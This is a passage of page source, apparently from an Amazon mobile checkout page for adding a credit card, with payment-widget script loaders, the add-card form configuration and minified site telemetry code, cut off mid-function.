 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/31CWIt7PpQL.js?AUIClients/APXWidgetsAssets-APXWidgets-GlobalInstallmentLending');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/31gUuU0p4OL.js?AUIClients/APXWidgetsAssets-APXWidgets-FoodVoucherCard');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/01NntqeL3fL.js?AUIClients/APXWidgetsAssets-APXWidgets-BusinessInvoicing');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/01ghTmZWxzL.js?AUIClients/APXWidgetsAssets-APXWidgets-BusinessPaymentProducts');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/31CpnYISE6L.js?AUIClients/APXWidgetsAssets-APXWidgets-AmazonPayEMI');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/11FLRVpft9L.js?AUIClients/APXWidgetsAssets-APXWidgets-PaymentAuthenticationApprovers');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/01RRCzTIGEL.js?AUIClients/APXWidgetsAssets-APXWidgets-B2BPaymentsAcceptance');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/01ABJiWqfwL.js?AUIClients/APXWidgetsAssets-APXWidgets-Bellamy');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/51Rug0B2RYL.js?AUIClients/APXWidgetsAssets-APXWidgets-AIPS');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/013ll6WhZAL.js?AUIClients/APXWidgetsAssets-APXWidgets-NetBankingCard');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/01UQyGktSML.js?AUIClients/APXWidgetsAssets-APXWidgets-DPMCommon');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/01xxApHnfyL.js?AUIClients/APXWidgetsAssets-APXWidgets-PaymentLocation');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/01iFWiaisVL.js?AUIClients/APXWidgetsAssets-APXWidgets-Boleto');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/314RepM++zL.js?AUIClients/APXWidgetsAssets-APXWidgets-AmazonProductVouchers');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/01N8Y19wNZL.js?AUIClients/APXWidgetsAssets-APXWidgets-MobileCarrierBilling');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/21-hZBVYg0L.js?AUIClients/APXWidgetsAssets-APXWidgets-PostPay');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/01-aaq0fL6L.js?AUIClients/APXWidgetsAssets-APXWidgets-RewardsAccount');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/51v9nQjHwfL.js?AUIClients/APXWidgetsAssets-APXWidgets-EquatedMonthlyInstallments');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/01MO6nvtT1L.js?AUIClients/APXWidgetsAssets-APXWidgets-BLIK');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/21njsjvTWzL.js?AUIClients/APXWidgetsAssets-APXWidgets-AmazonBusinessCredit');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/21nLOGfN-dL.js?AUIClients/APXWidgetsAssets-APXWidgets-OfficialValidDocument');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/011NTyaMItL.js?AUIClients/APXWidgetsAssets-APXWidgets-Maple');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/01pdiXFwV9L.js?AUIClients/APXWidgetsAssets-APXWidgets-Points');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/01j3UbDYoSL.js?AUIClients/APXWidgetsAssets-APXWidgets-WeChatPay');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/413Uil5n-YL.js?AUIClients/APXWidgetsAssets-APXWidgets-ZipPay');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/21O8cpr6qsL.js?AUIClients/APXWidgetsAssets-APXWidgets-ShopWithPoints');});
</script>
<script type="text/javascript">
 P.when('ready').execute(function() { P.load.js('https://images-na.ssl-images-amazon.com/images/I/41x4pecYN0L.js?AUIClients/APXWidgetsAssets-APXWidgets-PayWithBankAccount');});
</script>
<script type="text/javascript">//<![CDATA[
(function() {
        PaymentsPortal2.modules.when(['widget-factory'], function(wf) {
          var options = {"widgetRequestPrefix":"f1","testAjaxAuthenticationRequired":"false","clientId":"Checkout","serializedState":"4-MS30CHhc0DBsYNHvGZ2YZ2X86bMm-ZLUnA9qF8W5y4Q3RfTTq1dZxtclr5Qf7DWPR_rh4jQaHOdiiUM_3rM36-UY7W1wgZzno5MAt_bEUei3z9dT4R8e3cdMdzd_ukK9OPZ2ACJQqOJdUAYXbZxnBNeDabl8PrdM4psAgpp9FejgoN3JFHwhtoxwBBMVkOwxRFJVhuh60Ka6kCfvnLocv4qtzYZaiOnMrT160-lRKDLjnVQWglzO51H07uDP7b4ifKWoHJZ4vT_j5dKrVxgrpyx3Y1SCImtk8NpfCjjfup2hcStn70ymajRq2Jf9ZncPJCzsS_bxxGImCtzRERGW35kFrMTeXUEaGguQKleeHVHDmfccQj9swsCcrhAfmI2J07Zu4GsdKetSQMQ4_DwIkLdo0O_bjTKpnDhEWAdjd7zvqbJIglSW0rk0wX3ASqu3aGsw2Lt7uY3QbCRpuKtJkxFC5kHKEIdsS7qk6YattJHz1Hn-9b4uOJ181U6M9EyJwzoKBJz8ZcgWBAS_13FLMjT0ap_4Q1_UC6vDVhu-N9TBAxadHl7HirA-B8IPq7DKzGC01B4ektjeO4pJURwE5Pp9RLjEhy7NIBfMGL2lFb79ZiPDra2Y9UGTSH9EUcJPNju4SaBMZ6EZl6t3VXe4ZnVM8SO5i0NAhXz8xV_8a7JTDWr_B-sQWj9zuq50mzryl8UFJqiJ4keaFhq9lZNtCTQbX8wp92YgsUS8n7WujnqroqZEf7C20bP5TN4eygxLEjGuDOrSRD5YrzIvjaOEzkKhkf13BKRoobExdDfFyMA5bk7AX-SgQNcZTZqrGpQpIldkBYZaAurdNzgnQyOjzMShG6a5cvpTRvThZDoHDIPy19lTxbx1mPy8xUv10_k-tAoUufb4K_QCULsNjjqW_SwzX3U_WhQsiDIWqHEqghUKPcbT2RVoRqZ3dbQkuCaCbDdYOhSXmgtow46St4QjMRsa4Udsq5_ghGkrVMxnFQwCfcFc_byJw4E5gqv9hbz4qqtJ7jyRAojfLv816HBBnUitSI6wDekE4CrQx7OdpRsMMc5ws2QsmdPbsGJNjva-Gz0gFht22cDON5LazwC1DMRplg9zBRMsIbRSA_WH5LjKiFVmIVbwoRp8dn6Cw156QlIw8-HRG8N2kWfsNy7dtxckTJZywyc5RFNo6OcAaCkHagb0pXeopgWMDWI39VguniLAEz6BHfRcw-XYCbazLGtzlK0mShyG3lkfe1pjL2F5GMykGczs1kTUf4c8wCOSMruNguOYTTgIV_dhiBSM1n00vsur2cIAKX_YH12N1xy_RTxTg69-F1Tdtlohf3TKLwUIpgK-0z6hRnEg4HbrtidAkjB3vcMoQQbsMSNNBPZZ3cHCOPcSaFniwrYDJrKy9I3hxDTXJ5ynpGHIa7wBIi81zRWxAoI07Vp78pzBjemfDxx428Pe-OeRtXr-gOprs0Ovkln3BVMjqO4A3AkDiSuJhPCywKARTNrS6ZJmtIM1iaEDvq0uYO7hRbmInyFKbgZk0DuoXp3PYCX8Iv5HmksBkDmIHupwdS7PtvZUFA6kLxTuPqmueZA2w8dAdRjn7jEjU2ZtMuizC8tX9RKpqWmEiwT8XU2hqyJUBpUmu84Wy1Rn2iuiayk2lWM0jYLQuO0CYU1G3FiIvgVcq9i7ubCL4HRQ0q05CQBauR_xoR9EhIIqy8KYgGJTKZP7eukA8BHo1wlsV29jyd2botgaPyKT7xGTLCi1a-C841HrSvKmKeBgPilO9dURKZutMhZQvoFQWvx46Jq88HpX1P9WiLZdyxqXGaQmZTRCw67oE2y33GPUOo2kyCcVjfFbhRhXaI2tDDEOhu1e55h0KBLQmfOY2she4qfeQUQPLDT5WCHNoqv6VmgUm52s4eEpZssPGtAlZUzJwlVNCs9yIlOMkNv5dWAe-JhJ6jxfEIaJOR0uPCIvxCxCLcBMX7Q1UUaMk_pFJFlURzgz8K-0q7ux3wpXgV1O7-VmtxGFcPq7gRyCaZcSlVUtmXEBDrprifN5S9OSlzeaOJpvCRifVxvlJvf_ll-g1VpRv5OhBVc3Kq8AnsPc0k-YEkIsdd7pSgQXuvF0GRFtRaVn3XtsAZdqpIvZJ0EcO2YUWANRhnB05UqlDh_MkgwhBT715LlJaPvAZaqT0GBiY0zehRUzFtpw5WuQIyLIOlvkxrdQ7v8sVc2ddh-FvIZVIHW7-irfq-13f94JNoFxLD5VzmyXxW_3MytizxtFdzFWi66hbKtKUlsrkWFimRM5W9vuJPrnxGhrXWElpJ_r6vdHKo8N3L-aCqV7fo5CNWRz89ipYLbjobT0g7yIaS3JM7Oo31NPxfHWIPECihVtUKhsS15ZqduXAWcJ_T1DrRWcdrgd_gYJXeijnrDu4ppVQnWsOkx62ziPTHTzOSAzy3oUB9LUgdbwFQkFgJOceUdJ56o1AF5HiN8I04veLyouy5nH96qdJUw8wnch-fHVxe0HnDA2jfZrbXHrDiulFxMyrWws8y_QJOrsd11i_B1NrKgYnhBgRHOXwq3fyEEXN2fOK0bqC7g-T3pcXEefEPbjUScTv8z_ZVbFcslHXPSlEpVh5fBTgAJ0z7cGe0DgN3q6alxL6O3zmI2F9ZRIEFVsVmHEVg2gRPOXltRt37dJkbYwBQzRQkbio9CP_pqzXxPF42Y","marketplaceId":"ATVPDKIKX0DER","deviceType":"mobile","locale":"en_US","customerId":"A1TUZ9T43ZGRGT","sessionId":"139-6209373-4758101","requestId":"9BH15D7TY9EC4M7ZAWTN","widgetInstanceId":"fFNl9K6z9m7Q","continueRequestAjaxSubstitutionEnabled":true};
          var data = [{"elementReferences":{"asyncWidgetSpinnerComponent":"pp-aaOBA9-9"},"elementDOMEventMethodBindings":[],"data":{"spinnerName":"asyncWidgetSpinnerComponent","keepSpinnerOnWidgetDone":false},"id":"pp-aaOBA9-8","elementReferenceTagType":{},"type":"AsyncWidgetSpinnerComponent"},{"elementReferences":{},"elementDOMEventMethodBindings":[],"data":{},"id":"pp-aaOBA9-4","elementReferenceTagType":{},"type":"CardScanComponent"},{"elementReferences":{},"elementDOMEventMethodBindings":[],"data":{"enable":true,"placementType":"CreditCard"},"id":"pp-aaOBA9-7","elementReferenceTagType":{},"type":"IdentifyCreditCardComponent"},{"elementReferences":{"errorMessagesBoxContainer":"pp-aaOBA9-14","addCreditCardNumber":"pp-aaOBA9-17","accountHolderName":"pp-aaOBA9-16","pmts-add-creditcard-form":"pp-aaOBA9-13","pmts-account-holder-name-input":"pp-aaOBA9-16","expiry-date-label":"pp-aaOBA9-21","updateEverywhereAddCreditCard":"pp-aaOBA9-24","expirationDate_year":"pp-aaOBA9-23","getNameOnAccount":"pp-aaOBA9-15","secondaryInputFields":"pp-aaOBA9-18","newCreditCardSubmitButton":"pp-aaOBA9-25","expirationDate_month":"pp-aaOBA9-22","addCreditCardContainer":"pp-aaOBA9-12"},"elementDOMEventMethodBindings":[],"data":{"formDefinition":{"fields":{"expirationDate":{"monthParameterName":"expirationDate_month","dayParameterName":"expirationDate_day","yearParameterName":"expirationDate_year","combinedMonthYearParameterName":"expirationDate_combinedMonthYear"},"addCreditCardPostalCode":{"defaultParameterName":"addCreditCardPostalCode","fieldRequiredParameterName":"addCreditCardPostalCode_isRequired"},"addCreditCardNumber":{"defaultParameterName":"addCreditCardNumber"},"useBillingAddress":{"defaultParameterName":"useBillingAddress"},"accountHolderName":{"defaultParameterName":"accountHolderName"},"mobileNumber":{"defaultParameterName":"mobileNumber","fieldRequiredParameterName":"mobileNumber_isRequired"},"updateEverywhereAddCreditCard":{"defaultParameterName":"updateEverywhereAddCreditCard"},"addCreditCardVerificationNumber":{"defaultParameterName":"addCreditCardVerificationNumber","fieldRequiredParameterName":"addCreditCardVerificationNumber_isRequired"},"getNameOnAccount":{"defaultParameterName":"getNameOnAccount"},"setBuyingPreference":{"defaultParameterName":"setBuyingPreference"}},"constraints":[{"field":"accountHolderName","failureMessage":null,"metricValueType":"AccountHolderName","failureMessageStringId":"pmts_portal_add_instrument_credit_card_error_name_required","isCriticalOrRestricted":true,"parameters":{},"validation":"NonEmptyFieldConstraint"},{"field":"addCreditCardNumber","failureMessage":null,"metricValueType":"CreditCardNumber","failureMessageStringId":"pmts_portal_add_instrument_credit_card_error_card_number_required","isCriticalOrRestricted":true,"parameters":{},"validation":"NonEmptyFieldConstraint"},{"field":"addCreditCardNumber","failureMessage":null,"metricValueType":"CreditCardNumber","failureMessageStringId":"pmts_portal_add_instrument_credit_card_error_incorrect_card_number","isCriticalOrRestricted":true,"parameters":{},"validation":"ValidCreditCardNumberConstraint"},{"field":"expirationDate","failureMessage":null,"metricValueType":"ExpirationDate","failureMessageStringId":"pmts_portal_add_instrument_credit_card_error_exp_date_invalid","isCriticalOrRestricted":false,"parameters":{},"validation":"CreditCardExpirationConstraint"},{"field":"addCreditCardPostalCode","failureMessage":null,"metricValueType":"Unspecified","failureMessageStringId":"pmts_portal_add_instrument_credit_card_error_postal_code_invalid","isCriticalOrRestricted":true,"parameters":{"pattern":"(^[0-9]{3,20}$)"},"validation":"ValidCreditCardPostalCodeConstraint"}],"validationEvent":"AddCreditCardValidationFailedEvent","actionEvent":"AddCreditCardEvent"},"addFormJSBinding":"pmts-add-creditcard-form","addNameOnAccountCheckboxBinding":"getNameOnAccount","isSecureRegistrationWidget":true,"hasErrors":"false","isCombineAddCCAndDCEnabled":false,"debitCardConfiguration":{"InternationalMaestro CIT":{"showCvv":true,"showExpiry":true},"InternationalMaestro SMP":{"showCvv":false,"showExpiry":false},"Rupay URP":{"showCvv":true,"showExpiry":true},"OtherBanks":{"showCvv":true,"showExpiry":true}},"placementType":"CreditCard","JsBindingExpirationMonthDropdown":"expirationDate_month","expiryDateTextInputBinding":"expiryDateTextInput","addFormContainerJSBinding":"addCreditCardContainer","isINMarketplace":false,"secondaryFormFieldsJSBindElementReference":"secondaryInputFields","JsBindingExpirationYearDropdown":"expirationDate_year","declarativeActionName":"add-credit-card-action-name-pp-aaOBA9-3","isAddingMbcc":false,"secureIframeName":"ApxSecureIframe","issuersRequireSecurityToken":[],"suppressExpirationForInternationalMaestro":false,"addAccountHolderNameBinding":"accountHolderName","JsBindingExpirationDateLabel":"expiry-date-label","addCardNumberBinding":"addCreditCardNumber","formQualifier":null,"debitCardSBIMaestroValue":"InternationalMaestro SMP","issuersHaveNoExpiration":["AmazonPLCC"],"isCvvForMbcc":false,"clearPrePopulatedAccountNameBinding":"pmts-clear-prepopulated-account-name-input","showIssuerImageOnTextInputField":false,"warningBrands":[],"addButtonJSBinding":"newCreditCardSubmitButton","action":"add-credit-card","hideSecondaryFormFields":false,"showExpiryDateTextInputField":false,"issuersRequirePostalCode":[]},"id":"pp-aaOBA9-3","elementReferenceTagType":{"accountHolderName":"TextInputTag","addCreditCardNumber":"TextInputTag","expirationDate_month":"DropdownTag","expirationDate_year":"DropdownTag"},"type":"AddCreditCardComponent"},{"elementReferences":{"addCreditCardWorkflowContainer":"pp-aaOBA9-11"},"elementDOMEventMethodBindings":[],"data":{"isAddCreditCardWorkflowWidget":false,"isCCSyncVerificationEnabled":false,"isSecureRegistrationWidget":true,"placementType":"CreditCard","dynamicContinueFormDescription":{"action":"https://apx-security.amazon.com:443/cpe/pm/register","inputs":[]},"inPickAddressWorkflow":false,"secureIframeName":"ApxSecureIframe","isRequestForMobileApp":false,"isDebit":false,"listenerSecurePaymentMethodAddedEvent":"CheckoutSecurePaymentMethodAddedEventfFNl9K6z9m7Q","isSelectableTemplate":false,"dispatcherSecurePaymentMethodAddedEvent":"CheckoutSecurePaymentMethodAddedEventg2JbCLuPSrff","dynamicContinueEnabled":false},"id":"pp-aaOBA9-2","elementReferenceTagType":{},"type":"AddCreditCardWorkflowComponent"},{"elementReferences":{"add-payment-instrument-page":"pp-aaOBA9-10"},"elementDOMEventMethodBindings":[],"data":{"securePaymentMethodAddedEvent":"CheckoutSecurePaymentMethodAddedEventfFNl9K6z9m7Q","isStandaloneAddPIWidget":false,"dynamicContinueFormDescription":{"action":"https://apx-security.amazon.com:443/cpe/pm/register","inputs":[]},"showSecondaryView":"false","deviceType":"mobile","isRequestForMobileApp":false,"dynamicContinueEnabled":false},"id":"pp-aaOBA9-1","elementReferenceTagType":{},"type":"AddPaymentInstrumentComponent"}];
          var localizedStrings = {"pmts_portal_add_instrument_credit_card_error_card_number_required":"Card number is required.","pmts_portal_add_instrument_credit_card_error_exp_date_invalid":"Expiration date is not correct.","pmts_portal_add_instrument_credit_card_error_name_required":"Cardholder's name is required.","pmts_portal_add_instrument_credit_card_error_postal_code_invalid":"Please enter a valid postal code","pmts_portal_add_credit_card_verify_failed_heading":"Your card could not be verified","pmts_portal_add_instrument_credit_card_error_incorrect_card_number":"Card number is not correct.","pmts_portal_add_credit_card_security_code_help_desc_three_digit":"The security code is 3 digits, often on the back of your card, near the signature line. It is a different number from your account number or PIN.","pmts_portal_add_credit_card_name_label":"Name on card","pmts_portal_add_credit_card_security_code_help_desc_amex":"Your card\u2019s security code is 4 digits printed above the account number on the front of the card."};
          var widgetCreationEpochMilliseconds = 1623223496881;

          wf.create('SecureAddPaymentInstrument', options, data, localizedStrings, widgetCreationEpochMilliseconds);
        });
      }());
//]]></script>
</div></div></div><div id="be" style="display:none;visibility:hidden;"><form name="ue_backdetect" action="get"><input type="hidden" name="ue_back" value="2"></form>


<script type="text/javascript">
window.ue_ibe = (window.ue_ibe || 0) + 1;
if (window.ue_ibe === 1) {
(function(e,c){function h(b,a){f.push([b,a])}function g(b,a){if(b){var c=e.head||e.getElementsByTagName("head")[0]||e.documentElement,d=e.createElement("script");d.async="async";d.src=b;d.setAttribute("crossorigin","anonymous");a&&a.onerror&&(d.onerror=a.onerror);a&&a.onload&&(d.onload=a.onload);c.insertBefore(d,c.firstChild)}}function k(){ue.uels=g;for(var b=0;b<f.length;b++){var a=f[b];g(a[0],a[1])}ue.deffered=1}var f=[];c.ue&&(ue.uels=h,c.ue.attach&&c.ue.attach("load",k))})(document,window);


if (window.ue && window.ue.uels) {
        var cel_widgets = [ { "c":"celwidget" },{ "s":"#nav-swmslot > div", "id_gen":function(elem, index){ return 'nav_sitewide_msg'; } } ];

                ue.uels("https://images-na.ssl-images-amazon.com/images/I/31PaR7mjhbL.js");
}
var ue_mbl=ue_csm.ue.exec(function(e,a){function m(g){b=g||{};a.AMZNPerformance=b;b.transition=b.transition||{};b.timing=b.timing||{};if(a.csa){var c;b.timing.transitionStart&&(c=b.timing.transitionStart);b.timing.processStart&&(c=b.timing.processStart);c&&(csa("PageTiming")("mark","nativeTransitionStart",c),csa("PageTiming")("mark","transitionStart",c))}e.ue.exec(n,"csm-android-check")()&&b.tags instanceof Array&&(g=-1!=b.tags.indexOf("usesAppStartTime")||b.transition.type?!b.transition.type&&-1<
b.tags.indexOf("usesAppStartTime")?"warm-start":void 0:"view-transition",g&&(b.transition.type=g));"reload"===f._nt&&e.ue_orct||"intrapage-transition"===f._nt?d&&d.timing&&d.timing.navigationStart?b.timing.transitionStart=d.timing.navigationStart:delete b.timing.transitionStart:"undefined"===typeof f._nt&&d&&d.timing&&d.timing.navigationStart&&a.history&&"function"===typeof a.History&&"object"===typeof a.history&&a.history.length&&1!=a.history.length&&(b.timing.transitionStart=d.timing.navigationStart);
g=b.transition;c=f._nt?f._nt:void 0;g.subType=c;a.ue&&a.ue.tag&&a.ue.tag("has-AMZNPerformance");f.isl&&a.uex&&a.uex("at","csm-timing");p()}function q(b){a.ue&&a.ue.count&&a.ue.count("csm-cordova-plugin-failed",1)}function n(){return a.cordova&&a.cordova.platformId&&"android"==a.cordova.platformId}function p(){try{a.P.register("AMZNPerformance",function(){return b})}catch(g){}}function k(){if(!b)return"";ue_mbl.cnt=null;for(var a=b.timing,c=b.transition,a=["mts",l(a.transitionStart),"mps",l(a.processStart),
"mtt",c.type,"mtst",c.subType,"mtlt",c.launchType],c="",d=0;d<a.length;d+=2){var f=a[d],e=a[d+1];"undefined"!==typeof e&&(c+="&"+f+"="+e)}return c}function l(a){if("undefined"!==typeof a&&"undefined"!==typeof h)return a-h}function r(a,c){b&&(h=c,b.timing.transitionStart=a,b.transition.type="view-transition",b.transition.subType="ajax-transition",b.transition.launchType="normal",ue_mbl.cnt=k)}var f=e.ue||{},h=e.ue_t0,d=a.performance,b;if(a.P&&a.P.when&&a.P.register)return 1===a.ue_fnt&&(h=a.aPageStart||
e.ue_t0),a.P.when("CSMPlugin").execute(function(a){a.buildAMZNPerformance&&a.buildAMZNPerformance({successCallback:m,failCallback:q})}),{cnt:k,ajax:r}},"mobile-timing")(ue_csm,ue_csm.window);

(function(d){d._uess=function(){var a="";screen&&screen.width&&screen.height&&(a+="&sw="+screen.width+"&sh="+screen.height);var b=function(a){var b=document.documentElement["client"+a];return"CSS1Compat"===document.compatMode&&b||document.body["client"+a]||b},c=b("Width"),b=b("Height");c&&b&&(a+="&vw="+c+"&vh="+b);return a}})(ue_csm);

(function(a){var b=document.ue_backdetect;b&&b.ue_back&&a.ue&&(a.ue.bfini=b.ue_back.value);a.uet&&a.uet("be");a.onLdEnd&&(window.addEventListener?window.addEventListener("load",a.onLdEnd,!1):window.attachEvent&&window.attachEvent("onload",a.onLdEnd));a.ueh&&a.ueh(0,window,"load",a.onLd,1);a.ue&&a.ue.tag&&(a.ue_furl?(b=a.ue_furl.replace(/\./g,"-"),a.ue.tag(b)):a.ue.tag("nofls"))})(ue_csm);

(function(g,h){function d(a,d){var b={};if(!e||!f)try{var c=h.sessionStorage;c?a&&("undefined"!==typeof d?c.setItem(a,d):b.val=c.getItem(a)):f=1}catch(g){e=1}e&&(b.e=1);return b}var b=g.ue||{},a="",f,e,c,a=d("csmtid");f?a="NA":a.e?a="ET":(a=a.val,a||(a=b.oid||"NI",d("csmtid",a)),c=d(b.oid),c.e||(c.val=c.val||0,d(b.oid,c.val+1)),b.ssw=d);b.tabid=a})(ue_csm,ue_csm.window);

ue_csm.ue.exec(function(e,f){var a=e.ue||{},b=a._wlo,d;if(a.ssw){d=a.ssw("CSM_previousURL").val;var c=f.location,b=b?b:c&&c.href?c.href.split("#")[0]:void 0;c=(b||"")===a.ssw("CSM_previousURL").val;!c&&b&&a.ssw("CSM_previousURL",b);d=c?"reload":d?"intrapage-transition":"first-view"}else d="unknown";a._nt=d},"NavTypeModule")(ue_csm,window);
ue_csm.ue.exec(function(c,a){function g(a){a.run(function(e){d.tag("csm-feature-"+a.name+":"+e);d.isl&&c.uex("at")})}if(a.addEventListener)for(var d=c.ue||{},f=[{name:"touch-enabled",run:function(b){var e=function(){a.removeEventListener("touchstart",c,!0);a.removeEventListener("mousemove",d,!0)},c=function(){b("true");e()},d=function(){b("false");e()};a.addEventListener("touchstart",c,!0);a.addEventListener("mousemove",d,!0)}}],b=0;b<f.length;b++)g(f[b])},"csm-features")(ue_csm,window);


(function(b,c){var a=c.images;a&&a.length&&b.ue.count("totalImages",a.length)})(ue_csm,document);
(function(b){function c(){var d=[];a.log&&a.log.isStub&&a.log.replay(function(a){e(d,a)});a.clog&&a.clog.isStub&&a.clog.replay(function(a){e(d,a)});d.length&&(a._flhs+=1,n(d),p(d))}function g(){a.log&&a.log.isStub&&(a.onflush&&a.onflush.replay&&a.onflush.replay(function(a){a[0]()}),a.onunload&&a.onunload.replay&&a.onunload.replay(function(a){a[0]()}),c())}function e(d,b){var c=b[1],f=b[0],e={};a._lpn[c]=(a._lpn[c]||0)+1;e[c]=f;d.push(e)}function n(b){q&&(a._lpn.csm=(a._lpn.csm||0)+1,b.push({csm:{k:"chk",
f:a._flhs,l:a._lpn,s:"inln"}}))}function p(a){if(h)a=k(a),b.navigator.sendBeacon(l,a);else{a=k(a);var c=new b[f];c.open("POST",l,!0);c.setRequestHeader&&c.setRequestHeader("Content-type","text/plain");c.send(a)}}function k(a){return JSON.stringify({rid:b.ue_id,sid:b.ue_sid,mid:b.ue_mid,mkt:b.ue_mkt,sn:b.ue_sn,reqs:a})}var f="XMLHttpRequest",q=1===b.ue_ddq,a=b.ue,r=b[f]&&"withCredentials"in new b[f],h=b.navigator&&b.navigator.sendBeacon,l="//"+b.ue_furl+"/1/batch/1/OE/",m=b.ue_fci_ft||5E3;a&&(r||h)&&
(a._flhs=a._flhs||0,a._lpn=a._lpn||{},a.attach&&(a.attach("beforeunload",a.exec(g,"fcli-bfu")),a.attach("pagehide",a.exec(g,"fcli-ph"))),m&&b.setTimeout(a.exec(c,"fcli-t"),m),a._ffci=a.exec(c))})(window);


(function(k,c){function l(a,b){return a.filter(function(a){return a.initiatorType==b})}function f(a,c){if(b.t[a]){var g=b.t[a]-b._t0,e=c.filter(function(a){return 0!==a.responseEnd&&m(a)<g}),f=l(e,"script"),h=l(e,"link"),k=l(e,"img"),n=e.map(function(a){return a.name.split("/")[2]}).filter(function(a,b,c){return a&&c.lastIndexOf(a)==b}),q=e.filter(function(a){return a.duration<p}),s=g-Math.max.apply(null,e.map(m))<r|0;"af"==a&&(b._afjs=f.length);return a+":"+[e[d],f[d],h[d],k[d],n[d],q[d],s].join("-")}}
function m(a){return a.responseEnd-(b._t0-c.timing.navigationStart)}function n(){var a=c[h]("resource"),d=f("cf",a),g=f("af",a),a=f("ld",a);delete b._rt;b._ld=b.t.ld-b._t0;b._art&&b._art();return[d,g,a].join("_")}var p=20,r=50,d="length",b=k.ue,h="getEntriesByType";b._rre=m;b._rt=c&&c.timing&&c[h]&&n})(ue_csm,window.performance);


(function(c,d){var b=c.ue,a=d.navigator;b&&b.tag&&a&&(a=a.connection||a.mozConnection||a.webkitConnection)&&a.type&&b.tag("netInfo:"+a.type)})(ue_csm,window);


(function(c,d){function h(a,b){for(var c=[],d=0;d<a.length;d++){var e=a[d],f=b.encode(e);if(e[k]){var g=b.metaSep,e=e[k],l=b.metaPairSep,h=[],m=void 0;for(m in e)e.hasOwnProperty(m)&&h.push(m+"="+e[m]);e=h.join(l);f+=g+e}c.push(f)}return c.join(b.resourceSep)}function s(a){var b=a[k]=a[k]||{};b[t]||(b[t]=c.ue_mid);b[u]||(b[u]=c.ue_sid);b[f]||(b[f]=c.ue_id);b.csm=1;a="//"+c.ue_furl+"/1/"+a[v]+"/1/OP/"+a[w]+"/"+a[x]+"/"+h([a],y);if(n)try{n.call(d[p],a)}catch(g){c.ue.sbf=1,(new Image).src=a}else(new Image).src=
a}function q(){g&&g.isStub&&g.replay(function(a,b,c){a=a[0];b=a[k]=a[k]||{};b[f]=b[f]||c;s(a)});l.impression=s;g=null}if(!(1<c.ueinit)){var k="metadata",x="impressionType",v="foresterChannel",w="programGroup",t="marketplaceId",u="session",f="requestId",p="navigator",l=c.ue||{},n=d[p]&&d[p].sendBeacon,r=function(a,b,c,d){return{encode:d,resourceSep:a,metaSep:b,metaPairSep:c}},y=r("","?","&",function(a){return h(a.impressionData,z)}),z=r("/",":",",",function(a){return a.featureName+":"+h(a.resources,
A)}),A=r(",","@","|",function(a){return a.id}),g=l.impression;n?q():(l.attach("load",q),l.attach("beforeunload",q));try{d.P&&d.P.register&&d.P.register("impression-client",function(){})}catch(B){c.ueLogError(B,{logLevel:"WARN"})}}})(ue_csm,window);



var ue_pty = "CPEFront";

var ue_spty = "AddPaymentMethod";



var ue_adb = 4;
var ue_adb_rtla = 1;
ue_csm.ue.exec(function(y,a){function t(){if(d&&f){var a;a:{try{a=d.getItem(g);break a}catch(c){}a=void 0}if(a)return b=a,!0}return!1}function u(){if(a.fetch)fetch(m).then(function(a){if(!a.ok)throw Error(a.statusText);return a.text?a.text():null}).then(function(b){b?(-1<b.indexOf("window.ue_adb_chk = 1")&&(a.ue_adb_chk=1),n()):h()})["catch"](h);else e.uels(m,{onerror:h,onload:n})}function h(){b=k;l();if(f)try{d.setItem(g,b)}catch(a){}}function n(){b=1===a.ue_adb_chk?p:k;l();if(f)try{d.setItem(g,
